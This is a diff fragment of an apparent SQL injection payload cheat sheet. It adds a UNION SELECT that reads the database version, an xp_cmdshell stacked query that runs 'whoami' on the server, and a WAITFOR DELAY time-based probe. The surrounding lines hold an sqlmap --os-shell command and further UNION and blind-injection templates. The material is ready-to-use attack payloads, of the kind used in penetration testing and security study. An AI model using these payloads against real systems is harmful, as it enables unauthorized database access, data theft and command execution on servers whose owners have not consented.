@@ -85,6 +85,8 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 ' UNION ALL SELECT {payload}--
 ' UNION SELECT {payload}--
+' UNION SELECT null, @@version--
+'; EXEC xp_cmdshell 'whoami'--
 ' OR (SELECT {payload}) IS NOT NULL--
 ' OR (SELECT {payload}) IS NULL--
 '+{payload}+
@@ -177,6 +179,7 @@ SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a')
 #### MSSQL
 ```
 IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+'; WAITFOR DELAY '00:00:05'--
 ```
 
 #### PostgreSQL
